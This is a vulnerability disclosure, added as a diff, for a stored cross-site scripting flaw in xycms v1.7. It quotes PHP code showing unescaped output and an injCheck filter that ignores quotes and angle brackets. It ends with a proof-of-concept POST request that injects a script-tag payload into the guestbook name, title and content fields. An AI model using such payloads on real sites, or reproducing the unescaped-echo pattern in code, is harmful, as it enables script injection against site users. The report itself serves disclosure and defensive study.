@@ -1,0 +1,85 @@
+There is a storage xss vulnerability in xycms v1.7(php)
+
+Description:
+There is a storage xss vulnerability in /www/xycms_v1.7/system/edit_book.php
+
+Vulnerability reasons:
+
+1. Part of the code for the background processing of the website
+
+The code in the /www/xycms_v1.7/system/edit_book.php vulnerability section is as follows():
+...   
+   <tr>
+        <td width="10%" ><font color="red">*</font>留言者姓名</td>
+        <td width="90%" >
+          <input type="text" class="input-text" name="b_name"  id="b_name"  size="55" value="<?php echo $e_rs['b_name'];?>" />
+          &nbsp;
+          </td>
+      </tr>
+ ...
+ <?php echo $e_rs['b_name'];?>    //Print variables directly, no filtering
+ 
+2. Part of the code for the front of processing of the website
+
+The code in the /www/xycms_v1.7/add_book.php vulnerability section is as follows():
+...
+<form action="add_do.php" method="post" name="b_form" id="p_form">
+...
+  <tr>
+                  <td><span>姓 名：</span></td>
+                  <td><input name="b_name" class="b_input" size="40" id="b_name" /> <font color="#FF0000"><i id="b_n_t"></i> *</font></td>
+     </tr>
+...
+
+     Check /www/xycms_v1.7/add_do.php to find out：
+     ...
+     $siteinfo = array(
+		'type_id' => intval(trim($_POST['type_id'])),
+		'b_title' => injCheck($_POST['b_title']),
+		'b_content' => injCheck($_POST['b_content']),
+		'b_name' => injCheck($_POST['b_name']),
+		'b_tel' => injCheck($_POST['b_tel']),
+		'b_mail' => injCheck($_POST['b_mail']),
+		'b_qq' => injCheck($_POST['b_qq']),
+		'b_ip' => injCheck($_POST['b_ip']),
+		'c_date' => time()
+		);
+    
+    $db->insert("xycms_book", $siteinfo); //Storage xss vulnerability due to site being stored in the database
+    ...
+    
+    The inchjeck function code is as follows(pathname:/www/xycms_v1.7/Libs/Function/fun.php)：
+    function injCheck($sql_str) { 
+	        $check = preg_match('/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/', $sql_str);
+//The preg_match function is not filtered  " , < and >. So we can bypass it
+	         if ($check) {
+		      ok_info('/index.php','非法字符');
+		      exit;
+	          } else {
+		          return $sql_str;
+	         }
+       }
+  ...
+  
+POC:
+  
+POST /xycms_v1.7/add_do.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://127.0.0.1/xycms_v1.7/add_book.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 283
+Cookie: PHPSESSID=a77dokj3jqo614aub6akei0cl0
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+b_yzcode=e4b9561a9124329c2eb0e8d5473c36bc&b_ip=127.0.0.1&type_id=1
+&b_title="><script>alert(1)</script><"
+&b_content="><script>alert(1)</script><"
+&b_name="><script>alert(1)</script><"
+&b_tel=&b_mail=&b_qq=&checkcode=oskt
+    
+    
